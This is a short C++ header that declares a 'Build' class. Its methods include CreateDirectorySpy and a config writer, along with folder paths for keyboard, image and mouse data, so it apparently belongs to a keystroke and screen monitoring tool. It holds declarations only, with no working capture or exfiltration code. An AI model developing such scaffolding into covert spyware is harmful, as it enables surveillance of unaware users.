#pragma once
#include <iostream>
#include <filesystem>
#include <fstream>

using std::system; 
namespace fs = std::filesystem;

class Build
{
public:
	Build(std::string user);
	~Build(){};
	void CreateDirectorySpy();
	void CreateFileConfig(std::string user, std::string computer, std::string id, std::string date, std::string time);
	bool Path();
	bool Keyboard();
	bool Image();
	bool Mouse();
	bool existConfig();
	std::string getPath();
	std::string getPathKeyboard();
	std::string getPathImage();
	std::string getPathMouse();

private:
	std::string directoryPath;
	std::string directoryPathKeyboard;
	std::string directoryPathImage;
	std::string directoryPathMouse;
};